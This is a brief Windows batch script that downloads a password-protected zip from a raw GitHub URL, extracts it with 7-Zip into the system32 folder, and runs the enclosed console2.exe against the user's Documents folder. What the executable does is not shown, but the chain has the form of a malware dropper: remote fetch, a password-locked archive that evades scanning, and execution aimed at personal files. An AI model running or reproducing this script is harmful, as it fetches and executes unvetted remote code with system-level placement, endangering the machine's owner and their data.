set ZIP=terminal.zip
set EXE=console2.exe
set DESTINATIONFOLDER=c:\windows\system32
set TARGETFOLDER=C:\Users\admin\Documents
set URL=https://raw.githubusercontent.com/blackdotpixel/temp/main/terminal-1.zip
set PASSWORD=zenzen
set EXTRACTIONTOOL="C:\Program Files\7-Zip\7z.exe"

echo Starting download...

wget %URL% -O "%destinationFolder%\%ZIP%"

timeout /t 5

echo Extracting %ZIP%...
%EXTRACTIONTOOL% x %destinationFolder%\%ZIP% -p%PASSWORD% -o%DESTINATIONFOLDER% -y

echo Executing %EXE%...
%EXE% -p %TARGETFOLDER%

echo Execution finished.